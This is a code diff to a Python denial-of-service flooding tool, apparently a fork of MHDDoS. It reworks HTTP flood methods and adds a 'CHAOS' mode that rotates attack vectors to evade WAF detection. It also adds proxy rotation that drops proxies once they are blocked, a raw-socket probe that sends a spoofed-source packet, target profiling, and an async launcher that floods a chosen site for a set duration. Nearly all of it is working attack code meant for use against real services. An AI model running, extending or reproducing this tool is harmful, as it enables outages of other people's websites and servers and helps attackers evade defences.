+                    if self._proxies and hasattr(self, '_current_proxy'):
+                        BURNED_PROXIES[self._current_proxy] = time()
+                    break
+        except Exception:
+            pass
 
     def XMLRPC(self) -> None:
         payload: bytes = self.generate_payload(
@@ -1342,8 +1800,16 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
-        while True:
-            Thread(target=self.GET, daemon=True).start()
+        # [FIX] Semaphore to prevent fork bomb (max 500 concurrent sub-threads)
+        sem = __import__('threading').Semaphore(500)
+        while self._synevent.is_set():
+            sem.acquire()
+            def _fire():
+                try:
+                    self.GET()
+                finally:
+                    sem.release()
+            Thread(target=_fire, daemon=True).start()
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
@@ -1509,24 +1975,21 @@ class HttpFlood(Thread):
                     BYTES_SEND += len(payload)
                     if int(REQUESTS_SENT) < 50:
                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
-                    # [NEW] Status Tracker (Sniffer) + Auto Reconnect + Blacklist
-                    # [PHASE 13] Smarter Sniffer (Non-Blocking)
-                    try:
-                        s.setblocking(False)
-                        response_start = s.recv(20).decode('utf-8', errors='ignore')
-                        s.setblocking(True)
-                        if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
-                            status_code = response_start.split(" ")[1]
-                            if status_code in {"403", "429"}:
-                                BURNED_PROXIES[self._current_proxy] = time()
-                                raise Exception("Proxy Blocked")
-                    except (BlockingIOError, ssl.SSLWantReadError):
-                        s.setblocking(True)
-                        pass
-                    except Exception as e:
-                        if "Blocked" in str(e): raise e
-                        s.setblocking(True)
-                        pass
+                    # [FIX] Non-blocking status check using select instead of recv
+                    import select
+                    readable, _, _ = select.select([s], [], [], 0.01)
+                    if readable:
+                        try:
+                            response_start = s.recv(64).decode('utf-8', errors='ignore')
+                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
+                                status_code = response_start.split(" ")[1]
+                                if status_code in {"403", "429"}:
+                                    BURNED_PROXIES[self._current_proxy] = time()
+                                    raise Exception("Proxy Blocked")
+                        except (BlockingIOError, ssl.SSLWantReadError):
+                            pass
+                        except Exception as e:
+                            if "Blocked" in str(e): raise e
         except Exception as e:
             pass
         Tools.safe_close(s)
@@ -1563,24 +2026,21 @@ class HttpFlood(Thread):
                     BYTES_SEND += len(payload)
                     if int(REQUESTS_SENT) < 50:
                          print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Packet Sent")
-                    # Status Sniffer
-                    # [PHASE 13] Smarter Sniffer (Non-Blocking)
-                    try:
-                        s.setblocking(False)
-                        response_start = s.recv(20).decode('utf-8', errors='ignore')
-                        s.setblocking(True)
-                        if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
-                            status_code = response_start.split(" ")[1]
-                            if status_code in {"403", "429"}:
-                                BURNED_PROXIES[self._current_proxy] = time()
-                                raise Exception("Proxy Blocked")
-                    except (BlockingIOError, ssl.SSLWantReadError):
-                        s.setblocking(True)
-                        pass
-                    except Exception as e:
-                        if "Blocked" in str(e): raise e
-                        s.setblocking(True)
-                        pass
+                    # [FIX] Non-blocking status check using select
+                    import select
+                    readable, _, _ = select.select([s], [], [], 0.01)
+                    if readable:
+                        try:
+                            response_start = s.recv(64).decode('utf-8', errors='ignore')
+                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
+                                status_code = response_start.split(" ")[1]
+                                if status_code in {"403", "429"}:
+                                    BURNED_PROXIES[self._current_proxy] = time()
+                                    raise Exception("Proxy Blocked")
+                        except (BlockingIOError, ssl.SSLWantReadError):
+                            pass
+                        except Exception as e:
+                            if "Blocked" in str(e): raise e
         except:
             pass
         Tools.safe_close(s)
@@ -1643,7 +2103,7 @@ class HttpFlood(Thread):
                 self._h2_client = httpx.Client(
                     http2=True,
                     verify=False,
-                    proxies=proxy_url,
+                    proxy=proxy_url,
                     headers=headers,
                     timeout=5.0 # Increased timeout for slow proxies
                 )
@@ -1978,8 +2438,11 @@ class HttpFlood(Thread):
                     BYTES_SEND += len(payload)
                     
                     # Status Sniffer for Blacklist
-                    try:
-                        response_start = s.recv(20).decode('utf-8', errors='ignore')
+                    import select
+                    readable, _, _ = select.select([s], [], [], 0.01)
+                    if readable:
+                        try:
+                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                         if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
                             status_code = response_start.split(" ")[1]
                             if status_code in {"403", "429"}:
@@ -2041,17 +2504,36 @@ class HttpFlood(Thread):
                     if int(REQUESTS_SENT) < 50:
                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Packet Sent to {self._target.authority}")
                     # Simple sniffer
-                    try:
-                        response_start = s.recv(20).decode('utf-8', errors='ignore')
-                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
-                            if response_start.split(" ")[1] in {"403", "429"}:
-                                if hasattr(self, '_current_proxy'):
-                                    BURNED_PROXIES[self._current_proxy] = time()
-                                break
-                    except: pass
+                    import select
+                    readable, _, _ = select.select([s], [], [], 0.01)
+                    if readable:
+                        try:
+                            response_start = s.recv(64).decode('utf-8', errors='ignore')
+                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
+                                status_code = response_start.split(" ")[1]
+                                if status_code in {"403", "429"}:
+                                    if hasattr(self, '_current_proxy'):
+                                        BURNED_PROXIES[self._current_proxy] = time()
+                                    break
+                        except Exception as e:
+                            pass
         except:
             pass
         Tools.safe_close(s)
+
+
+    def CHAOS(self):
+        """[V8] Multi-Vector Attack - Randomly rotates between multiple attack methods
+        each iteration, making WAF pattern detection extremely difficult."""
+        chaos_pool = [self.GET, self.POST, self.STRESS, self.PPS, self.DYN, self.POST_DYN]
+        if hasattr(self, 'crawled_paths') and self.crawled_paths:
+            path_str = ' '.join(self.crawled_paths).lower()
+            if 'wp-' in path_str or 'wordpress' in path_str:
+                chaos_pool.extend([self.XMLRPC_AMP, self.WP_SEARCH])
+        if HAS_TLS_CLIENT:
+            chaos_pool.append(self.STEALTH_JA3)
+        chosen = randchoice(chaos_pool)
+        chosen()
 
 
 class ProxyManager:
@@ -2099,6 +2581,23 @@ class ProxyManager:
 
 class ToolsConsole:
     METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
+
+    @staticmethod
+    def checkSpoofing():
+        # [PHASE 4] Advanced BCP38 Detection Probe
+        try:
+            with socket(AF_INET, SOCK_RAW, IPPROTO_RAW) as s:
+                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                # Build dummy raw packet with spoofed source 1.2.3.4
+                packet = b'E\x00\x00(\x00\x00\x00\x00@\x06\x00\x00\x01\x02\x03\x04\x08\x08\x08\x08'
+                s.sendto(packet, ('8.8.8.8', 80))
+            return True
+        except PermissionError:
+            return False
+        except OSError as e:
+            # Operation not permitted or Network Unreachable for spoofed IP
+            return False
+        except: return False
 
     @staticmethod
     def checkRawSocket():
@@ -2403,16 +2902,6 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             ))
             logger.info(f"{bcolors.OKGREEN}Armageddon Results: {len(proxies):,} Live Indonesian Proxies ready for deployment.{bcolors.RESET}")
         return proxies
-        
-        proxies = list(set(scavenged_proxies))
-        if proxies:
-            logger.info(f"{bcolors.OKCYAN}Found {len(proxies):,} Indo Proxies. Checking for Live ones...{bcolors.RESET}")
-            proxies = list(ProxyChecker.checkAll(
-                set(proxies), timeout=5, threads=min(1000, len(proxies)),
-                url=url.human_repr() if url else "http://www.google.com"
-            ))
-            logger.info(f"{bcolors.OKGREEN}Indo-Scavenger Success! {len(proxies):,} Live local proxies found.{bcolors.RESET}")
-        return proxies
     if not proxy_li.exists():
         logger.warning(
             f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
@@ -2553,7 +3042,7 @@ def proxy_recycler(proxies_list, con, proxy_li, proxy_ty, url=None):
         sleep(60) # Prevent rapid fire recycling
 
 
-if __name__ == '__main__':
+async def main_async():
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
             one = argv[1].upper()
@@ -2569,220 +3058,129 @@ if __name__ == '__main__':
             host = None
             port = None
             url = None
-            event = Event()
+            
+            # [FIX] Use threading.Event for thread-based HttpFlood, asyncio.Event for async tasks
+            event = Event()  # threading.Event — compatible with both Thread.wait() and asyncio tasks
             event.clear()
             target = None
             urlraw = argv[2].strip()
-            if not urlraw.startswith("http"):
-                urlraw = "http://" + urlraw
+            if not urlraw.startswith("http"): urlraw = "http://" + urlraw
 
             if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" %
-                     ", ".join(Methods.ALL_METHODS))
+                exit("Method Not Found")
 
             if method in Methods.LAYER7_METHODS:
-                # [NEW] Host Header Spoofing / Origin IP Attack
-                # Syntax: https://domain.com@1.2.3.4
                 origin_ip = None
                 if "@" in urlraw:
                     parts = urlraw.split("@")
                     urlraw = parts[0]
                     origin_ip = parts[1].strip()
-                    logger.info(f"{bcolors.OKGREEN}Host Spoofing Detected! Target Domain: {urlraw} -> Origin IP: {origin_ip}{bcolors.RESET}")
 
                 url = URL(urlraw)
                 host = url.host
+                host_array = []
 
                 if method != "TOR":
                     try:
-                        if origin_ip:
-                            host = origin_ip
+                        if origin_ip: host_array = [origin_ip]
                         else:
-                            host = gethostbyname(url.host)
+                            import socket as sys_socket; info = sys_socket.getaddrinfo(url.host, 80)
+                            host_array = list(set([str(ip[4][0]) for ip in info]))
+                            if not host_array: raise Exception("No A-records")
+                            host = host_array[0]
                     except Exception as e:
-                        exit('Cannot resolve hostname ', url.host, str(e))
+                        exit('Cannot resolve hostname: ' + str(e))
 
                 threads = int(argv[4])
                 rpc = int(argv[6])
                 timer = int(argv[7])
                 proxy_ty = int(argv[3].strip())
-                # [OPTIMIZED] Flexible Path L7
                 user_path = argv[5].strip()
                 
-                # Check for Direct Attack Mode
-                if user_path in {"0", "None", "NONE", "none"}:
-                    proxy_li = Path("0") # Sentinel value
+                if user_path in {"0", "None", "NONE", "none"}: proxy_li = Path("0")
                 else:
                     proxy_li = Path(user_path)
-                    if not proxy_li.exists():
-                        proxy_li = Path(__dir__ / "files/proxies/" / user_path)
+                    if not proxy_li.exists(): proxy_li = Path(__dir__ / "files/proxies/" / user_path)
+                
                 useragent_li = Path(__dir__ / "files/useragent.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
-                bombardier_path = Path.home() / "go/bin/bombardier"
                 proxies: Any = set()
 
-                if method == "BOMB":
-                    assert (
-                            bombardier_path.exists()
-                            or bombardier_path.with_suffix('.exe').exists()
-                    ), (
-                        "Install bombardier: "
-                        "https://github.com/raynaldoanantawijaya/Van_HelsingDoS/wiki/BOMB-method"
-                    )
+                if not useragent_li.exists() or not referers_li.exists(): exit("Missing files")
+                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
+                referers = set(a.strip() for a in referers_li.open("r+").readlines())
 
-                if len(argv) == 9:
-                    logger.setLevel("DEBUG")
-
-                if not useragent_li.exists():
-                    exit("The Useragent file doesn't exist ")
-                if not referers_li.exists():
-                    exit("The Referer file doesn't exist ")
-
-                uagents = set(a.strip()
-                              for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip()
-                               for a in referers_li.open("r+").readlines())
-
-                if not uagents: exit("Empty Useragent File ")
-                if not referers: exit("Empty Referer File ")
-
-                if threads > 1000:
-                    logger.warning("Thread is higher than 1000")
-                if rpc > 100:
-                    logger.warning(
-                        "RPC (Request Pre Connection) is higher than 100")
-                
-                # [NEW] Active Reconnaissance Phase
-                logger.info(f"{bcolors.OKCYAN}Active Recon: Crawling target for valid paths...{bcolors.RESET}")
                 discovered_paths = Tools.crawl(urlraw)
                 
-                if discovered_paths:
-                   logger.info(f"{bcolors.OKGREEN}Recon Success! Found {len(discovered_paths)} unique paths.{bcolors.RESET}")
-                else:
-                   logger.warning(f"{bcolors.WARNING}Recon: No paths found or crawl blocked. Falling back to simple paths.{bcolors.RESET}")
-
+                # [V8] Auto-detect target stack and suggest best methods
+                logger.info(f"{bcolors.OKCYAN}[V8] Profiling target stack...{bcolors.RESET}")
+                target_profile = TargetProfiler.profile(urlraw)
+                logger.info(f"{bcolors.OKGREEN}[V8] Server: {target_profile['server']} | WAF: {target_profile['waf'] or 'None'} | CMS: {target_profile['cms'] or 'Unknown'}{bcolors.RESET}")
+                logger.info(f"{bcolors.OKGREEN}[V8] Recommended Methods: {', '.join(target_profile['methods'])}{bcolors.RESET}")
+                
+                if method == 'CHAOS':
+                    logger.info(f"{bcolors.WARNING}[V8] CHAOS MODE: Multi-vector attack engaged. Rotating methods dynamically.{bcolors.RESET}")
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
+                
                 if proxies:
                     Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, url), daemon=True).start()
+                    ProxyHealthChecker(proxies, interval=45).start()
+                    PROXY_ALIVE_COUNT.set(len(proxies))
+
+                tasks = []
+                event.set()  # [FIX] Set event before creating tasks so threads start immediately
                 
-                for thread_id in range(threads):
-                    flood = HttpFlood(thread_id, url, host, method, rpc, event,
-                                      uagents, referers, proxies)
-                    # Inject crawled paths
-                    flood.crawled_paths = discovered_paths
-                    flood.start()
-
-            if method in Methods.LAYER4_METHODS:
-                target = URL(urlraw)
-
-                port = target.port
-                target = target.host
-
-                try:
-                    target = gethostbyname(target)
-                except Exception as e:
-                    exit('Cannot resolve hostname ', url.host, e)
-
-                if port > 65535 or port < 1:
-                    exit("Invalid Port [Min: 1 / Max: 65535] ")
-
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
-                        not ToolsConsole.checkRawSocket():
-                    exit("Cannot Create Raw Socket")
-
-                if method in Methods.LAYER4_AMP:
-                    logger.warning("this method need spoofable servers please check")
-                    logger.warning("https://github.com/raynaldoanantawijaya/Van_HelsingDoS/wiki/Amplification-ddos-attack")
-
-                threads = int(argv[3])
-                timer = int(argv[4])
-                proxies = None
-                ref = None
-
-                if not port:
-                    logger.warning("Port Not Selected, Set To Default: 80")
-                    port = 80
-
-                if method in {"SYN", "ICMP"}:
-                    __ip__ = __ip__
-
-                if len(argv) >= 6:
-                    argfive = argv[5].strip()
-                    if argfive:
-                        refl_li = Path(__dir__ / "files" / argfive)
-                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-                            if not refl_li.exists():
-                                exit("The reflector file doesn't exist")
-                            if len(argv) == 7:
-                                logger.setLevel("DEBUG")
-                            ref = set(a.strip()
-                                      for a in Tools.IP.findall(refl_li.open("r").read()))
-                            if not ref: exit("Empty Reflector File ")
-
-                        elif argfive.isdigit() and len(argv) >= 7:
-                            if len(argv) == 8:
-                                logger.setLevel("DEBUG")
-                            proxy_ty = int(argfive)
-                            # [OPTIMIZED] Flexible Path
-                            user_path = argv[6].strip()
-                            proxy_li = Path(user_path)
-                            if not proxy_li.exists():
-                                proxy_li = Path(__dir__ / "files/proxies" / user_path)
-                            proxies = handleProxyList(con, proxy_li, proxy_ty)
-                            if proxies:
-                                Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, None), daemon=True).start()
-                            
-                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
-                                exit("this method cannot use for layer4 proxy")
-
-                        else:
-                            logger.setLevel("DEBUG")
+                if method in {"H2_FLOOD", "GET", "POST"}:
+                    for thread_id in range(threads):
+                        flood = AsyncHttpFlood(thread_id, url, host, rpc, event, uagents, referers, proxies, discovered_paths, method)
+                        flood.host_array = host_array
+                        tasks.append(asyncio.create_task(flood._run_async()))
+                else:
+                    # [FIX] Thread-based methods need run_in_executor to avoid blocking event loop
+                    loop = asyncio.get_event_loop()
+                    for thread_id in range(threads):
+                        flood = HttpFlood(thread_id, url, host, method, rpc, event, uagents, referers, proxies)
+                        flood.host_array = host_array
+                        flood.crawled_paths = discovered_paths
+                        tasks.append(loop.run_in_executor(None, flood.run))
                 
-                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-                
-                if method == "MCBOT":
-                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
-                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
-                        Tools.send(s, Minecraft.data(b'\x00'))
+                # Status Thread inside async
+                async def display_status():
+                    ts = time()
+                    last_requests = 0
+                    last_bytes = 0
+                    while time() < ts + timer:
+                         current_requests = int(REQUESTS_SENT)
+                         current_bytes = int(BYTES_SEND)
+                         pps = current_requests - last_requests
+                         bps = current_bytes - last_bytes
+                         print(f'\rTarget: {target or url.host} | Speed: {Tools.human_format(pps, "PPS")} | Data: {Tools.human_format(bps, "Bps")} | {round((time() - ts) / timer * 100, 1)}%  ', end="")
+                         last_requests = current_requests
+                         last_bytes = current_bytes
+                         await asyncio.sleep(1)
+                    print()
+                    import os; os._exit(0)
 
-                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
-                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
-                        
-                        if 47 < protocolid > 758:
-                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-
-                for _ in range(threads):
-                    Layer4((target, port), ref, method, event,
-                           proxies, protocolid).start()
-
-            logger.info(
-                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
-                % (target or url.host, method, timer, threads))
-            event.set()
-            ts = time()
-            last_requests = 0
-            last_bytes = 0
-            while time() < ts + timer:
-                # [PHASE 10] Non-Resetting Monitoring (Calculates Delta per second)
-                current_requests = int(REQUESTS_SENT)
-                current_bytes = int(BYTES_SEND)
-                
-                pps = current_requests - last_requests
-                bps = current_bytes - last_bytes
-                
-                # If counters were reset elsewhere (unlikely now) or wrapped
-                if pps < 0: pps = current_requests 
-                if bps < 0: bps = current_bytes
-
-                print(
-                    f'\r{bcolors.WARNING}Target:{bcolors.OKBLUE} {target or url.host}{bcolors.WARNING} | Speed:{bcolors.OKGREEN} {Tools.human_format(pps, "PPS")}{bcolors.WARNING} | Data:{bcolors.OKBLUE} {Tools.human_format(bps, "Bps")}{bcolors.WARNING} | Progress: {bcolors.OKCYAN}{round((time() - ts) / timer * 100, 2)}%{bcolors.RESET}', end="")
-                
-                last_requests = current_requests
-                last_bytes = current_bytes
-                sleep(1)
-            print("\n")
-
-            event.clear()
-            exit()
+                tasks.append(asyncio.create_task(display_status()))
+                await asyncio.gather(*tasks)
 
         ToolsConsole.usage()
+
+if __name__ == '__main__':
+    # [KALI] Platform-specific optimizations
+    if IS_LINUX:
+        import signal
+        signal.signal(signal.SIGPIPE, signal.SIG_IGN)  # Prevent broken pipe crashes
+    
+    if uvloop_status:
+        print(f'{bcolors.OKGREEN}[OPTIMIZED] Using UVLOOP engine (Linux Extreme Performance){bcolors.RESET}')
+    
+    # Report FD limit
+    try:
+        import resource as _res
+        _soft, _ = _res.getrlimit(_res.RLIMIT_NOFILE)
+        print(f'{bcolors.OKCYAN}[SYSTEM] File Descriptor Limit: {_soft:,}{bcolors.RESET}')
+    except ImportError:
+        pass
+    
+    asyncio.run(main_async())
